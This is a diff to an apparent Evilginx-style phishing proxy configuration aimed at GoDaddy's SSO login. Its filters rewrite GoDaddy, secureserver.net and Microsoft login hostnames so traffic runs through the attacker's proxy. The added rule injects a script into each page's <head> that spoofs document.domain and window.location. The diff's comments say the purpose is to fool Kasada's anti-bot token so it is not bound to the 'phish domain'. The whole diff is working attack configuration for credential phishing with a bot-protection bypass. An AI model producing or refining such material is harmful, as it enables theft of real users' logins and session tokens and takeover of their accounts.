@@ -103,10 +103,12 @@ sub_filters:
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'img6', domain: 'wsimg.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'secureserver.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  # Rewrite bare domain refs in Kasada KPSDK.configure and inline JS (auto_filter only catches URLs with protocol)
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '"domain"\s*:\s*"{hostname}"', replace: '"domain": "{hostname}"', mimes: ['text/html', 'application/javascript', 'text/javascript']}
   # Catch protocol-relative //sso.godaddy.com references
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '//{hostname}', replace: '//{hostname}', mimes: ['text/html', 'application/javascript', 'text/javascript']}
+  # Inject location/domain spoofer before Kasada KPSDK loads — must run first thing in <head>
+  # so that window.location.hostname and document.domain report the original GoDaddy values
+  # when KPSDK computes its anti-bot token (otherwise token is bound to phish domain → rejected).
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '(?i)(<head[^>]*>)', replace: '$1<script>(function(){try{var H="sso.godaddy.com";var D="godaddy.com";try{Object.defineProperty(document,"domain",{configurable:true,get:function(){return D},set:function(){}})}catch(e){}var L=window.location;try{Object.defineProperty(L,"hostname",{configurable:true,get:function(){return H}})}catch(e){}try{Object.defineProperty(L,"host",{configurable:true,get:function(){return H}})}catch(e){}}catch(e){}})();</script>', mimes: ['text/html']}
   # From idp.godaddy.com — IDP may reference SSO and login endpoints
   - {triggers_on: 'idp.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'idp.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
